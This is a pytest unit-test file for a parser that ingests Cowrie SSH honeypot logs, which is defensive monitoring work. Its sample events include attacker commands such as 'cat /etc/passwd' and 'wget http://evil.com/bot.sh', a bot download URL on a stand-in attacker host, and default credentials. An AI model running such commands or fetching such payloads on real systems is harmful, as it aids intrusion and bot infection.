"""tests/test_ingest_cowrie.py — Unit tests for pipeline.ingest_cowrie."""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from pipeline.ingest_cowrie import parse_cowrie_line


RUN_ID   = "test-run-000"
GIT_HASH = "deadbeef"
LOG_FILE = "/tmp/cowrie.json"


def _parse(raw_dict: dict, line_no: int = 1):
    return parse_cowrie_line(json.dumps(raw_dict), RUN_ID, GIT_HASH, LOG_FILE, line_no)


# ---------------------------------------------------------------------------

class TestParseCowrieLogin:
    def test_login_failed_event_type(self):
        ev = _parse({"eventid": "cowrie.login.failed", "timestamp": "2026-04-10T00:00:00Z",
                     "src_ip": "1.2.3.4", "src_port": 1234, "username": "root", "password": "123"})
        assert ev is not None
        assert ev["event_type"] == "login.failed"

    def test_login_failed_captures_credentials(self):
        ev = _parse({"eventid": "cowrie.login.failed", "timestamp": "2026-04-10T00:00:00Z",
                     "src_ip": "1.2.3.4", "src_port": 1234, "username": "admin", "password": "pass"})
        assert ev["username"] == "admin"
        assert ev["password"] == "pass"

    def test_login_success_event_type(self):
        ev = _parse({"eventid": "cowrie.login.success", "timestamp": "2026-04-10T00:00:01Z",
                     "src_ip": "5.6.7.8", "src_port": 9999, "username": "pi", "password": "raspberry"})
        assert ev["event_type"] == "login.success"

    def test_source_ip_captured(self):
        ev = _parse({"eventid": "cowrie.login.failed", "timestamp": "2026-04-10T00:00:00Z",
                     "src_ip": "185.220.101.45", "src_port": 51234})
        assert ev["source_ip"] == "185.220.101.45"
        assert ev["source_port"] == 51234


class TestParseCowrieCommand:
    def test_command_input_event_type(self):
        ev = _parse({"eventid": "cowrie.command.input", "timestamp": "2026-04-10T00:01:00Z",
                     "src_ip": "1.2.3.4", "input": "cat /etc/passwd"})
        assert ev["event_type"] == "command.input"

    def test_command_str_captured(self):
        ev = _parse({"eventid": "cowrie.command.input", "timestamp": "2026-04-10T00:01:00Z",
                     "src_ip": "1.2.3.4", "input": "wget http://evil.com/bot.sh"})
        assert ev["command_str"] == "wget http://evil.com/bot.sh"


class TestParseCowrieFileDownload:
    def test_file_download_event_type(self):
        ev = _parse({"eventid": "cowrie.session.file_download",
                     "timestamp": "2026-04-10T00:02:00Z", "src_ip": "1.2.3.4",
                     "url": "http://evil.com/bot", "shasum": "abc123"})
        assert ev["event_type"] == "session.file_download"

    def test_url_and_hash_in_raw_data(self):
        ev = _parse({"eventid": "cowrie.session.file_download",
                     "timestamp": "2026-04-10T00:02:00Z", "src_ip": "1.2.3.4",
                     "url": "http://evil.com/bot", "shasum": "abc123"})
        assert ev["raw_data"]["url"] == "http://evil.com/bot"
        assert ev["raw_data"]["shasum"] == "abc123"


class TestParseCowrieProvenance:
    def test_provenance_fields_set(self):
        ev = _parse({"eventid": "cowrie.login.failed", "timestamp": "2026-04-10T00:00:00Z",
                     "src_ip": "1.2.3.4"}, line_no=7)
        assert ev["pipeline_run_id"]   == RUN_ID
        assert ev["pipeline_version"]  == GIT_HASH
        assert ev["raw_file_path"]     == LOG_FILE
        assert ev["raw_line_number"]   == 7
        assert ev["source"]            == "cowrie"

    def test_invalid_json_returns_none(self):
        result = parse_cowrie_line("not json!", RUN_ID, GIT_HASH, LOG_FILE, 1)
        assert result is None

    def test_missing_timestamp_does_not_crash(self):
        ev = _parse({"eventid": "cowrie.login.failed", "src_ip": "1.2.3.4"})
        assert ev is not None

    def test_dest_port_captured(self):
        ev = _parse({"eventid": "cowrie.login.failed", "timestamp": "2026-04-10T00:00:00Z",
                     "src_ip": "1.2.3.4", "dst_port": 22})
        assert ev["dest_port"] == 22
